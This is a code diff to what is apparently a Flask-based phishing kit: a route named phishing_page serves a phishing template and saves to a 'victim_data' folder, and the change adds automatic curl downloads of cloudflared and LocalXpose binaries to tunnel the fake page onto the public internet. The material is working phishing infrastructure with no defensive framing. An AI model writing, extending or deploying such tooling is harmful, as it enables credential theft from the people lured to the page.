@@ -11,6 +11,19 @@ app = Flask(__name__, template_folder="templates")
 
 # Global variables
 victim_data_folder = "victim_data"
+server_folder = ".server"
+
+# Ensure required directories exist
+os.makedirs(victim_data_folder, exist_ok=True)
+os.makedirs(server_folder, exist_ok=True)
+
+# URLs for downloading dependencies
+CLOUDFLARED_URLS = {
+    "linux": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
+    "windows": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
+    "darwin": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64",
+}
+LOCALXPOSE_URL = "https://api.localxpose.io/downloads/localxpose-linux"
 
 @app.route("/", methods=["GET", "POST"])
 def phishing_page():
@@ -33,15 +46,44 @@ def phishing_page():
     return render_template("phishing_template.html")
 
 
+def download_dependency(url, output_path):
+    print(f"[*] Downloading {output_path}...")
+    try:
+        subprocess.run(["curl", "-L", "-o", output_path, url], check=True)
+        os.chmod(output_path, 0o755)  # Ensure the file is executable
+        print(f"[+] {output_path} downloaded successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Failed to download {output_path}: {e}")
+        exit(1)
+
+
+def ensure_cloudflared():
+    cloudflared_path = os.path.join(server_folder, "cloudflared")
+    if platform.system().lower() == "windows":
+        cloudflared_path += ".exe"
+
+    if not os.path.exists(cloudflared_path):
+        os_type = platform.system().lower()
+        if os_type not in CLOUDFLARED_URLS:
+            print("[!] Unsupported operating system for Cloudflared.")
+            exit(1)
+        download_dependency(CLOUDFLARED_URLS[os_type], cloudflared_path)
+    return cloudflared_path
+
+
+def ensure_localxpose():
+    localxpose_path = os.path.join(server_folder, "localxpose")
+    if not os.path.exists(localxpose_path):
+        download_dependency(LOCALXPOSE_URL, localxpose_path)
+    return localxpose_path
+
+
 def generate_localhost_url(port):
     return f"http://127.0.0.1:{port}"
 
 
 def start_cloudflared(port):
-    cloudflared_path = ".server/cloudflared"
-    if platform.system().lower() == "windows":
-        cloudflared_path += ".exe"
-
+    cloudflared_path = ensure_cloudflared()
     process = subprocess.Popen(
         [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
         stdout=subprocess.PIPE,
@@ -65,9 +107,9 @@ def start_cloudflared(port):
 
 
 def start_localxpose(port):
-    lx_path = ".server/localxpose"
+    localxpose_path = ensure_localxpose()
     process = subprocess.Popen(
-        [lx_path, "http", f"--port={port}"],
+        [localxpose_path, "http", f"--port={port}"],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         text=True,
